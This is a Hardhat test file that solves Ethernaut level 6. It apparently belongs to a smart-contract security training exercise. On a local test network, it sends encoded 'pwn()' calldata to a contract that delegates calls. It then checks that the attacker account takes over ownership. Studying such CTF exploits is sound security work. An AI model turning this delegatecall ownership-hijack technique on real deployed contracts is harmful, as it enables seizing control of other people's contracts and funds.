const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Ethernaut - Six", function () {
  async function deployContracts() {
    const [deployer, user1] = await ethers.getSigners();

    const EthernautSixDelegate = await ethers.getContractFactory(
      "EthernautSixDelegate"
    );
    const ethernautSixDelegate = await EthernautSixDelegate.deploy(
      deployer.address
    );
    await ethernautSixDelegate.deployed();

    const EthernautSixDelegation = await ethers.getContractFactory(
      "EthernautSixDelegation"
    );
    const ethernautSixDelegation = await EthernautSixDelegation.deploy(
      ethernautSixDelegate.address
    );
    await ethernautSixDelegation.deployed();

    return { ethernautSixDelegate, ethernautSixDelegation, deployer, user1 };
  }

  describe("Exploit", function () {
    it("Ownership claimed", async function () {
      const { ethernautSixDelegate, ethernautSixDelegation, deployer, user1 } =
        await loadFixture(deployContracts);

      expect(await ethernautSixDelegate.owner()).to.equal(deployer.address);
      expect(await ethernautSixDelegation.owner()).to.equal(deployer.address);

      const ABI = ["function pwn()"];
      const iface = new ethers.utils.Interface(ABI);
      const data = iface.encodeFunctionData("pwn");

      await user1.sendTransaction({
        to: ethernautSixDelegation.address,
        data,
        gasLimit: 35000,
      });

      expect(await ethernautSixDelegate.owner()).to.equal(deployer.address);
      expect(await ethernautSixDelegation.owner()).to.equal(user1.address);
    });
  });
});
